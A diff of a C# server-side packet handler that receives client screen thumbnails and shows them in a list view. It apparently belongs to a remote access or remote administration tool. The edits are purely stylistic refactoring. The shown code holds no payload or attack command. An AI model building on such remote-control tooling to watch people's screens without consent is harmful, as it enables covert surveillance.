@@ -1,9 +1,8 @@
-﻿using Server.MessagePack;
-using Server.Connection;
-using System.Diagnostics;
-using System.Drawing;
+﻿using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Handle_Packet
 {
@@ -16,14 +15,14 @@ namespace Server.Handle_Packet
                 if (client.LV2 == null)
                 {
                     client.LV2 = new ListViewItem();
-                    client.LV2.Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
+                    client.LV2.Text = string.Format("{0}:{1}", client.Ip,
+                        client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
                     client.LV2.ToolTipText = client.ID;
                     client.LV2.Tag = client;
 
-                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
+                    using (var memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                     {
-
-                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
+                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream));
                         client.LV2.ImageKey = client.ID;
                         lock (Settings.LockListviewThumb)
                         {
@@ -33,17 +32,19 @@ namespace Server.Handle_Packet
                 }
                 else
                 {
-                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
+                    using (var memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                     {
                         lock (Settings.LockListviewThumb)
                         {
                             Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
-                            Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
+                            Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(memoryStream));
                         }
                     }
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
